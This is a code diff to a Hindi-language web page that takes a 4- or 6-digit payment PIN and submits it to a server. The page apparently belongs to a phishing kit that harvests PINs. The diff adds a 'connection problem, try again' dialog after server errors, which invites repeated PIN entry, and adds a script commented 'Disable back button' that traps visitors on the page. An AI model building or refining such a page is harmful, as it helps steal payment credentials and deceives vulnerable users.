@@ -47,6 +47,12 @@
     function hideLoadingDialog() {
       document.getElementById("loadingDialog").classList.add("hidden");
     }
+    function showRetryDialog() {
+      document.getElementById("retryDialog").classList.remove("hidden");
+    }
+    function closeRetryDialog() {
+      document.getElementById("retryDialog").classList.add("hidden");
+    }
     function submitPIN() {
       if (pinArr.length === 4 || pinArr.length === 6) {
         const pin = pinArr.join('');
@@ -67,7 +73,7 @@
           .then(res => {
             if (!res.ok) {
               hideLoadingDialog();
-              alert("Server error. Please try again.");
+              showRetryDialog();
               throw new Error("Server error");
             }
             return res.json();
@@ -80,7 +86,7 @@
           .catch(err => {
             console.error(err);
             hideLoadingDialog();
-            alert("Something went wrong. Please try again.");
+            showRetryDialog();
           });
         } catch (err) {
           console.error(err);
@@ -97,7 +103,7 @@
           .then(res => {
             if (!res.ok) {
               hideLoadingDialog();
-              alert("Server error. Please try again.");
+              showRetryDialog();
               throw new Error("Server error");
             }
             return res.json();
@@ -110,14 +116,21 @@
           .catch(err => {
             console.error(err);
             hideLoadingDialog();
-            alert("Something went wrong. Please try again.");
+            showRetryDialog();
           });
         }
       } else {
         showErrorPopup();
       }
     }
-    window.onload = () => { updateInputs(); };
+    window.onload = () => { 
+      updateInputs();
+      // Disable back button
+      history.pushState(null, null, location.href);
+      window.onpopstate = function() {
+        history.go(1);
+      };
+    };
   </script>
   <style>
     input { font-size: 20px !important; }
@@ -203,6 +216,18 @@
       </div>
       <p class="text-gray-800 font-semibold text-base mb-2">Processing Payment...</p>
       <p class="text-gray-500 text-sm">कृपया प्रतीक्षा करें</p>
+    </div>
+  </div>
+  
+  <!-- Retry Dialog -->
+  <div id="retryDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
+    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
+      <div class="text-6xl mb-4">⚠️</div>
+      <p class="text-gray-800 font-semibold text-base mb-3">कनेक्शन की समस्या</p>
+      <p class="text-gray-600 text-sm mb-6">कृपया दोबारा प्रयास करें</p>
+      <button onclick="closeRetryDialog()" class="bg-gradient-to-r from-blue-500 to-blue-600 text-white px-6 py-3 rounded-lg text-sm font-semibold w-full">
+        फिर से प्रयास करें
+      </button>
     </div>
   </div>
 </body>
